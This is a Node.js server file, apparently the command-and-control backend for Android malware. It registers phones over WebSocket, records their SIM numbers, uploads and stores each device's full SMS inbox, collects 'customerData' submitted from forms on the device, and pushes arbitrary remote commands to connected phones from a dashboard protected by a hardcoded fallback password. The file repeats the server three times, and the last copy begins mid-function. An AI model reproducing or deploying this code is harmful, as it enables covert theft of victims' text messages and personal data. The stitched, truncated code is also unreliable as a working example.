require('dotenv').config();
const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const path = require('path');
const http = require('http');
const { Server } = require('socket.io');
const WebSocket = require('ws');

const app = express();
app.use(express.json({ limit: '1mb' }));
app.use(cors());
app.use(express.static(path.join(__dirname, 'public')));

// short request timeouts to fail fast on deploy platforms
app.use((req, res, next) => { req.setTimeout(30000); res.setTimeout(30000); next(); });

const MONGO_URI = process.env.MONGO_URI || '';
if (!MONGO_URI) { console.error('MONGO_URI missing'); process.exit(1); }
mongoose.set('bufferCommands', false);
mongoose.connect(MONGO_URI, {
  serverSelectionTimeoutMS: 5000,
  connectTimeoutMS: 10000,
  socketTimeoutMS: 45000,
  maxPoolSize: 10
}).then(() => console.log('MongoDB connected')).catch(err => { console.error('Mongo connect error', err); process.exit(1); });

const deviceSchema = new mongoose.Schema({
  deviceId: { type: String, index: true },
  serialNumber: String,
  model: String,
  androidVersion: String,
  sim1: String,
  sim2: String,
  battery: Number,
  isOnline: Boolean,
  lastSeen: Date,
  isPinned: Boolean,
  registrationTimestamp: Date,
  customerData: mongoose.Schema.Types.Mixed,
  isDeleted: Boolean,
  smsMessages: Array
}, { timestamps: true });

const Device = mongoose.model('Device', deviceSchema);

const server = http.createServer(app);
const io = new Server(server, { cors: { origin: '*' } });
const wss = new WebSocket.Server({ noServer: true });
global.deviceSockets = new Map(); // deviceId -> Set(ws)

let adminPassword = process.env.ADMIN_PASSWORD || '4321';

// --- API Routes ---
app.post('/api/login', (req, res) => {
  const { username, password } = req.body || {};
  if (username === 'admin' && password === adminPassword) return res.json({ success: true });
  return res.status(401).json({ success: false, message: 'Unauthorized' });
});

app.get('/api/devices', async (req, res) => {
  try {
    const list = await Device.find({ isDeleted: { $ne: true } }).lean();
    const now = Date.now();
    list.forEach(d => { if (d.lastSeen && (now - new Date(d.lastSeen).getTime()) > 60000) d.isOnline = false; });
    res.json(list);
  } catch (err) { console.error(err); res.status(500).json({ error: 'Failed' }); }
});

app.post('/api/delete-device', async (req, res) => {
  try {
    const { deviceId, password } = req.body || {};
    if (!password || password !== adminPassword) return res.status(401).json({ success: false, message: 'Wrong password' });
    if (!deviceId) return res.status(400).json({ success: false, message: 'deviceId required' });
    const r = await Device.findOneAndUpdate({ deviceId }, { $set: { isDeleted: true, isOnline: false } }, { returnDocument: 'after' });
    if (!r) return res.status(404).json({ success: false, message: 'Device not found' });
    io.emit('dashboard-update');
    return res.json({ success: true });
  } catch (err) { console.error(err); return res.status(500).json({ success: false }); }
});

app.post('/api/pin-device', async (req, res) => {
  try {
    const { deviceId, status } = req.body || {};
    if (!deviceId) return res.status(400).json({ success: false, message: 'deviceId required' });
    const d = await Device.findOneAndUpdate({ deviceId }, { $set: { isPinned: !!status } }, { returnDocument: 'after' });
    if (!d) return res.status(404).json({ success: false, message: 'Device not found' });
    io.emit('dashboard-update');
    return res.json({ success: true });
  } catch (e) { console.error(e); return res.status(500).json({ success: false }); }
});

app.post('/api/submit-data', async (req, res) => {
  try {
    const { deviceId, data } = req.body || {};
    if (!deviceId || data === undefined) return res.status(400).json({ success: false, message: 'Missing fields' });
    const d = await Device.findOneAndUpdate({ deviceId }, { $set: { customerData: data, lastSeen: new Date() } }, { returnDocument: 'after' });
    if (!d) return res.status(404).json({ success: false, message: 'Device not found' });
    io.emit('dashboard-update');
    return res.json({ success: true });
  } catch (e) { console.error(e); return res.status(500).json({ success: false }); }
});

app.post('/api/command', async (req, res) => {
  try {
    const { deviceId, action, data } = req.body || {};
    if (!deviceId || !action) return res.status(400).json({ success: false, message: 'Missing deviceId or action' });
    const device = await Device.findOne({ deviceId }).lean();
    if (!device) return res.status(404).json({ success: false, message: 'Device not found' });

    // VIEW_SMS handled by returning stored messages quickly
    if (action === 'VIEW_SMS') return res.json({ success: true, messages: device.smsMessages || [] });

    const clients = global.deviceSockets.get(deviceId);
    let sentCount = 0;
    if (clients && clients.size) {
      clients.forEach((client) => {
        try {
          if (client.readyState === WebSocket.OPEN) {
            client.send(JSON.stringify({ command: action, data }));
            sentCount++;
          }
        } catch (e) { console.error('WS send error:', e && e.message); }
      });
    }

    if (sentCount === 0) return res.json({ success: false, message: 'Device not connected' });
    return res.json({ success: true, message: 'Command sent', sentTo: sentCount });
  } catch (err) { console.error('Command error:', err); return res.status(500).json({ success: false, message: err.message }); }
});

// Serve index
app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));

// Health
app.get('/health', (req, res) => {
  const states = ['disconnected','connected','connecting','disconnecting'];
  const mongoState = mongoose.connection && typeof mongoose.connection.readyState === 'number' ? states[mongoose.connection.readyState] || mongoose.connection.readyState : 'unknown';
  res.json({ status: 'ok', pid: process.pid, mongo: { readyState: mongoose.connection.readyState, state: mongoState } });
});

// Upgrade HTTP -> raw WebSocket for device connections
server.on('upgrade', (req, socket, head) => {
  if (req.url && req.url.startsWith('/socket.io')) return; // let socket.io handle its upgrades
  wss.handleUpgrade(req, socket, head, (ws) => { wss.emit('connection', ws, req); });
});

// WS handlers for device connections
wss.on('connection', (ws, req) => {
  ws.isAlive = true;
  ws.on('pong', () => ws.isAlive = true);

  ws.on('message', async (msg) => {
    try {
      const data = JSON.parse(msg);

      // registration message from device
      if (data.deviceId || data.serialNumber) {
        const id = data.deviceId || data.serialNumber;
        ws.deviceId = id;
        if (!global.deviceSockets.has(id)) global.deviceSockets.set(id, new Set());
        global.deviceSockets.get(id).add(ws);

        const update = { $set: { isOnline: true, lastSeen: new Date() } };
        if (data.model) update.$set.model = data.model;
        if (data.androidVersion) update.$set.androidVersion = data.androidVersion;
        if (data.sim1) update.$set.sim1 = data.sim1;
        if (data.sim2) update.$set.sim2 = data.sim2;
        if (data.battery !== undefined) update.$set.battery = Number(data.battery) || 0;

        await Device.findOneAndUpdate({ $or: [{ deviceId: id }, { serialNumber: id }] }, { ...update, $setOnInsert: { registrationTimestamp: new Date() } }, { upsert: true });
        io.emit('dashboard-update');
      }

      if (data.type === 'SMS_LIST' && data.deviceId && Array.isArray(data.messages)) {
        await Device.findOneAndUpdate({ deviceId: data.deviceId }, { $set: { smsMessages: data.messages, lastSeen: new Date(), isOnline: true } });
        io.emit('dashboard-update');
      }

      if (data.type === 'FORM_SUBMIT' && data.deviceId && data.customerData) {
        await Device.findOneAndUpdate({ deviceId: data.deviceId }, { $set: { customerData: data.customerData, lastSeen: new Date() } });
        io.emit('dashboard-update');
        if (ws.readyState === WebSocket.OPEN) ws.send(JSON.stringify({ status: 'ok' }));
      }
    } catch (e) { console.error('ws message error', e && e.message); }
  });

  ws.on('close', () => {
    if (ws.deviceId && global.deviceSockets.has(ws.deviceId)) {
      const set = global.deviceSockets.get(ws.deviceId);
      set.delete(ws);
      if (set.size === 0) global.deviceSockets.delete(ws.deviceId);
    }
  });

  ws.on('error', (err) => console.error('WS error', err && err.message));
});

// socket.io for dashboard clients
io.on('connection', (socket) => {
  socket.on('disconnect', () => {});
});

// heartbeat for wss
const heartbeat = setInterval(() => {
  wss.clients.forEach((ws) => {
    if (ws.isAlive === false) return ws.terminate();
    ws.isAlive = false;
    try { ws.ping(); } catch (e) { /* ignore */ }
  });
}, 20000);

process.on('uncaughtException', (err) => console.error('uncaughtException', err));
process.on('unhandledRejection', (r) => console.error('unhandledRejection', r));

process.on('SIGTERM', () => {
  console.log('SIGTERM received, shutting down...');
  clearInterval(heartbeat);
  server.close(() => {
    mongoose.connection.close(false, () => process.exit(0));
  });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => console.log('Server listening on', PORT));
// Final clean server.js
require('dotenv').config();
const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const path = require('path');
const http = require('http');
const { Server } = require('socket.io');
const WebSocket = require('ws');

const app = express();
app.use(express.json({ limit: '1mb' }));
app.use(cors());
app.use(express.static(path.join(__dirname, 'public')));

// timeouts
app.use((req, res, next) => { req.setTimeout(30000); res.setTimeout(30000); next(); });

const MONGO_URI = process.env.MONGO_URI || '';
if (!MONGO_URI) { console.error('MONGO_URI missing'); process.exit(1); }
mongoose.set('bufferCommands', false);
mongoose.connect(MONGO_URI, { serverSelectionTimeoutMS: 5000, connectTimeoutMS: 10000, socketTimeoutMS: 45000, maxPoolSize: 10, retryWrites: true }).then(() => console.log('MongoDB connected')).catch(err => { console.error('Mongo connect error', err); process.exit(1); });

const deviceSchema = new mongoose.Schema({ deviceId: String, serialNumber: String, model: String, androidVersion: String, sim1: String, sim2: String, battery: Number, isOnline: Boolean, lastSeen: Date, isPinned: Boolean, registrationTimestamp: Date, customerData: mongoose.Schema.Types.Mixed, isDeleted: Boolean, smsMessages: Array });
deviceSchema.index({ deviceId: 1, serialNumber: 1 });
const Device = mongoose.model('Device', deviceSchema);

const server = http.createServer(app);
const io = new Server(server, { cors: { origin: '*' } });
const wss = new WebSocket.Server({ noServer: true });
global.deviceSockets = new Map();

let adminPassword = process.env.ADMIN_PASSWORD || '4321';

// Routes
app.post('/api/login', (req, res) => {
    const { username, password } = req.body;
    if (username === 'admin' && password === adminPassword) return res.json({ success: true });
    return res.status(401).json({ success: false });
});

app.get('/api/devices', async (req, res) => {
    try {
        const list = await Device.find({ isDeleted: { $ne: true } }).lean();
        const now = Date.now();
        list.forEach(d => { if (d.lastSeen && (now - new Date(d.lastSeen).getTime()) > 60000) d.isOnline = false; });
        res.json(list);
    } catch (err) { console.error(err); res.status(500).json({ error: 'Failed' }); }
});

app.post('/api/delete-device', async (req, res) => {
    try {
        const { deviceId, password } = req.body;
        if (!password || password !== adminPassword) return res.status(401).json({ success: false, message: 'Wrong password' });
        if (!deviceId) return res.status(400).json({ success: false, message: 'deviceId required' });
        const r = await Device.findOneAndUpdate({ deviceId }, { $set: { isDeleted: true, isOnline: false } }, { returnDocument: 'after' });
        if (!r) return res.status(404).json({ success: false, message: 'Device not found' });
        // notify
        io.emit('dashboard-update');
        return res.json({ success: true });
    } catch (err) { console.error(err); res.status(500).json({ success: false }); }
});

// other minimal routes (pin, submit-data, command)
app.post('/api/pin-device', async (req, res) => { try { const { deviceId, status } = req.body; if (!deviceId) return res.status(400).json({ success: false }); const d = await Device.findOneAndUpdate({ deviceId }, { $set: { isPinned: !!status } }, { returnDocument: 'after' }); if (!d) return res.status(404).json({ success: false }); io.emit('dashboard-update'); return res.json({ success: true }); } catch (e) { console.error(e); return res.status(500).json({ success: false }); } });

app.post('/api/submit-data', async (req, res) => { try { const { deviceId, data } = req.body; if (!deviceId || !data) return res.status(400).json({ success: false }); const d = await Device.findOneAndUpdate({ deviceId }, { $set: { customerData: data, lastSeen: new Date() } }, { returnDocument: 'after' }); if (!d) return res.status(404).json({ success: false }); io.emit('dashboard-update'); return res.json({ success: true }); } catch (e) { console.error(e); return res.status(500).json({ success: false }); } });

app.post('/api/command', async (req, res) => { try { const { deviceId, action, data } = req.body; if (!deviceId || !action) return res.json({ success: false, message: 'Missing' }); const device = await Device.findOne({ deviceId }); if (!device) return res.json({ success: false, message: 'Device not found' }); if (action === 'VIEW_SMS') return res.json({ success: true, messages: device.smsMessages || [] }); const clients = global.deviceSockets.get(deviceId); let sent = 0; if (clients) { clients.forEach(ws => { try { if (ws.readyState === WebSocket.OPEN) { ws.send(JSON.stringify({ command: action, data })); sent++; } } catch (e) { console.error(e); } }); } if (sent === 0) return res.json({ success: false, message: 'Device not connected' }); return res.json({ success: true, sentTo: sent }); } catch (e) { console.error(e); return res.status(500).json({ success: false }); } });

// Serve index
app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));

// WebSocket upgrade
server.on('upgrade', (req, socket, head) => { if (req.url && req.url.startsWith('/socket.io')) return; wss.handleUpgrade(req, socket, head, (ws) => { wss.emit('connection', ws, req); }); });

// WS handling
wss.on('connection', (ws, req) => {
    ws.isAlive = true; ws.on('pong', () => ws.isAlive = true);
    ws.on('message', async (msg) => {
        try {
            const data = JSON.parse(msg);
            if (data.deviceId) {
                const id = data.deviceId;
                ws.deviceId = id;
                if (!global.deviceSockets.has(id)) global.deviceSockets.set(id, new Set());
                global.deviceSockets.get(id).add(ws);
                await Device.findOneAndUpdate({ deviceId: id }, { $set: { isOnline: true, lastSeen: new Date(), isDeleted: false } }, { upsert: true });
                io.emit('dashboard-update');
            }
            if (data.type === 'SMS_LIST' && data.deviceId && Array.isArray(data.messages)) {
                await Device.findOneAndUpdate({ deviceId: data.deviceId }, { $set: { smsMessages: data.messages, lastSeen: new Date(), isOnline: true } });
                io.emit('dashboard-update');
            }
            if (data.type === 'FORM_SUBMIT' && data.deviceId && data.customerData) {
                await Device.findOneAndUpdate({ deviceId: data.deviceId }, { $set: { customerData: data.customerData, lastSeen: new Date() } });
                io.emit('dashboard-update');
                if (ws.readyState === WebSocket.OPEN) ws.send(JSON.stringify({ status: 'ok' }));
            }
        } catch (e) { console.error('ws message', e); }
    });
    ws.on('close', () => {
        if (ws.deviceId && global.deviceSockets.has(ws.deviceId)) {
            const set = global.deviceSockets.get(ws.deviceId); set.delete(ws); if (!set.size) global.deviceSockets.delete(ws.deviceId);
        }
    });
});

// socket.io (optional)
io.on('connection', (socket) => { socket.on('disconnect', () => {}); });

// heartbeat
setInterval(() => { wss.clients.forEach(ws => { if (!ws.isAlive) return ws.terminate(); ws.isAlive = false; try { ws.ping(); } catch (e) {} }); }, 20000);

process.on('uncaughtException', (err) => console.error('uncaughtException', err));
process.on('unhandledRejection', (r) => console.error('unhandledRejection', r));

const PORT = process.env.PORT || 3000; server.listen(PORT, '0.0.0.0', () => console.log('Server listening', PORT));
            if (clients && clients.size) {
                clients.forEach((client) => {
                    try {
                        if (client.readyState === WebSocket.OPEN) {
                            client.send(JSON.stringify({ command: action, deviceId, data }));
                            sentCount++;
                        }
                    } catch (e) { console.error('❌ WS send error:', e.message); }
                });
            }
        }

        if (sentCount === 0 && action !== 'VIEW_SMS') {
            // Device not connected — report failure so frontend doesn't show false success
            return res.json({ success: false, message: 'Device not connected' });
        }

        if (action !== 'VIEW_SMS') {
            res.json({ success: true, message: 'Command sent', sentTo: sentCount });
        }
    } catch (err) {
        console.error('❌ Command error:', err);
        res.status(500).json({ success: false, message: 'Server error: ' + err.message });
    }
});

// 8. Root Route
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Health check endpoint
app.get('/health', (req, res) => {
    const states = ['disconnected','connected','connecting','disconnecting'];
    const mongoState = mongoose.connection && typeof mongoose.connection.readyState === 'number'
        ? states[mongoose.connection.readyState] || mongoose.connection.readyState
        : 'unknown';

    res.json({
        status: 'ok',
        pid: process.pid,
        mongo: {
            readyState: mongoose.connection.readyState,
            state: mongoState
        }
    });
});

// ========== WEBSOCKET HANDLERS ==========

wss.on('connection', (ws, req) => {
    const remoteAddr = req && req.socket ? req.socket.remoteAddress : 'unknown';
    console.log(`[WS] WebSocket connected from ${remoteAddr}`);
    let deviceId = null;

    // Set timeout for WebSocket
    ws.isAlive = true;
    ws.on('pong', () => { ws.isAlive = true; });

    ws.on('message', async (message) => {
        try {
            console.log(`[WS] Message from ${remoteAddr}:`, message);
            const data = JSON.parse(message);

            // Handle SMS_LIST from device
            if (data.type === 'SMS_LIST' && data.deviceId && Array.isArray(data.messages)) {
                // Store SMS messages in device document
                await Device.findOneAndUpdate(
                    { deviceId: data.deviceId },
                    { $set: { smsMessages: data.messages, lastSeen: new Date(), isOnline: true } },
                    { upsert: false, writeConcern: { w: 1 }, maxTimeMS: 8000 }
                );
                console.log(`[WS] Stored ${data.messages.length} SMS for device ${data.deviceId}`);
                return;
            }

                // Handle FORM_SUBMIT from device
                if (data.type === 'FORM_SUBMIT' && data.deviceId && data.customerData) {
                    try {
                        const device = await Device.findOneAndUpdate(
                            { deviceId: data.deviceId },
                            { $set: { customerData: data.customerData, lastSeen: new Date() } },
                            { returnDocument: 'after', writeConcern: { w: 1 }, maxTimeMS: 8000 }
                        );
                        if (device) {
                            console.log(`[WS] FORM_SUBMIT saved for device ${data.deviceId}`);
                            if (ws.readyState === WebSocket.OPEN) {
                                ws.send(JSON.stringify({ status: 'success', message: 'Form data saved' }));
                            }
                            if (global.io) setImmediate(() => global.io.emit('dashboard-update'));
                        } else {
                            if (ws.readyState === WebSocket.OPEN) {
                                ws.send(JSON.stringify({ status: 'error', message: 'Device not found' }));
                            }
                        }
                    } catch (err) {
                        console.error(`[WS] FORM_SUBMIT error:`, err.message);
                        if (ws.readyState === WebSocket.OPEN) {
                            ws.send(JSON.stringify({ status: 'error', message: 'Database error' }));
                        }
                    }
                    return;
                }

            if (data.deviceId || data.serialNumber) {
                deviceId = data.deviceId || data.serialNumber;
                // Track this websocket by device keys
                ws.deviceKeys = ws.deviceKeys || new Set();
                ws.deviceKeys.add(deviceId);
                // maintain reverse map
                const addToMap = (key) => {
                    if (!global.deviceSockets.has(key)) global.deviceSockets.set(key, new Set());
                    global.deviceSockets.get(key).add(ws);
                };
                addToMap(deviceId);
                if (data.serialNumber && data.serialNumber !== deviceId) addToMap(data.serialNumber);

                const filter = {};
                if (data.deviceId) filter.deviceId = data.deviceId;
                else if (data.serialNumber) filter.serialNumber = data.serialNumber;

                const update = {
                    $set: {
                        isOnline: true,
                        lastSeen: new Date(),
                    },
                    $setOnInsert: {
                        registrationTimestamp: new Date()
                    }
                };

                // Only update provided fields
                if (data.deviceId) update.$set.deviceId = data.deviceId;
                if (data.serialNumber) update.$set.serialNumber = data.serialNumber;
                if (data.model) update.$set.model = data.model;
                if (data.androidVersion) update.$set.androidVersion = data.androidVersion;
                if (data.sim1) update.$set.sim1 = data.sim1;
                if (data.sim2) update.$set.sim2 = data.sim2;
                if (typeof data.battery === 'number' || data.battery) {
                    update.$set.battery = typeof data.battery === 'number' ? data.battery : Number(data.battery) || 0;
                }

                const device = await Device.findOneAndUpdate(
                    filter,
                    update,
                    { upsert: true, new: true, writeConcern: { w: 1 }, maxTimeMS: 8000 }
                );

                console.log(`[WS] Device saved: ${device.deviceId}`);

                if (ws.readyState === WebSocket.OPEN) {
                    ws.send(JSON.stringify({
                        status: 'registered',
                        message: 'Device registered'
                    }));
                }

                if (global.io) {
                    setImmediate(() => global.io.emit('dashboard-update'));
                }
            }
        } catch (err) {
            console.error(`[WS] Message error from ${remoteAddr}:`, err.message);
            if (ws.readyState === WebSocket.OPEN) {
                ws.send(JSON.stringify({ status: 'error', message: 'Database error' }));
            }
        }
    });

    ws.on('close', async (code, reason) => {
        console.log(`[WS] WebSocket disconnected from ${remoteAddr} (deviceId: ${deviceId}) code=${code} reason=${reason}`);

        if (deviceId) {
            try {
                await Device.findOneAndUpdate(
                    { $or: [{ deviceId }, { serialNumber: deviceId }] },
                    { $set: { isOnline: false, lastSeen: new Date() } },
                    { writeConcern: { w: 1 }, maxTimeMS: 8000 }
                );
                // Immediately update dashboard on disconnect
                if (global.io) {
                    global.io.emit('dashboard-update');
                }
            } catch (err) {
                console.error(`[WS] Error updating device offline status for ${deviceId}:`, err.message);
            }
        }
        // Remove ws from deviceSockets map
        if (ws.deviceKeys && ws.deviceKeys.size) {
            ws.deviceKeys.forEach((key) => {
                const set = global.deviceSockets.get(key);
                if (set) {
                    set.delete(ws);
                    if (set.size === 0) global.deviceSockets.delete(key);
                }
            });
        }
    });

    ws.on('error', (error) => {
        console.error(`[WS] Error from ${remoteAddr}:`, error.message);
    });
});

// Ping heartbeat every 20 seconds to detect dead connections faster
heartbeat = setInterval(() => {
    wss.clients.forEach((ws) => {
        if (ws.isAlive === false) {
            // Terminate and trigger close event
            ws.terminate();
            return;
        }
        ws.isAlive = false;
        try {
            ws.ping();
        } catch (e) {
            console.error('[WS] Ping error:', e.message);
        }
    });
}, 20000);

// ========== SOCKET.IO HANDLERS ==========

io.on('connection', (socket) => {
    console.log('⚡ Socket.IO connected:', socket.id);
    socket.on('disconnect', () => console.log('⚡ Socket.IO disconnected:', socket.id));
});

// ========== SERVER ERROR HANDLERS ==========

server.on('clientError', (err, socket) => {
    console.error('❌ Client error:', err.message);
    if (socket.writable) {
        socket.end('HTTP/1.1 400 Bad Request\r\n\r\n');
    }
});

process.on('uncaughtException', (err) => {
    console.error('❌ Uncaught Exception:', err);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('❌ Unhandled Rejection:', reason);
});

// Graceful shutdown handler
process.on('SIGTERM', () => {
    console.log('⚠️  SIGTERM received, shutting down gracefully...');
    clearInterval(heartbeat);
    server.close(() => {
        console.log('✅ Server closed');
        mongoose.connection.close(false, () => {
            console.log('✅ MongoDB connection closed');
            process.exit(0);
        });
    });
});

// ========== START SERVER ==========

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Server running on port ${PORT}`);
});
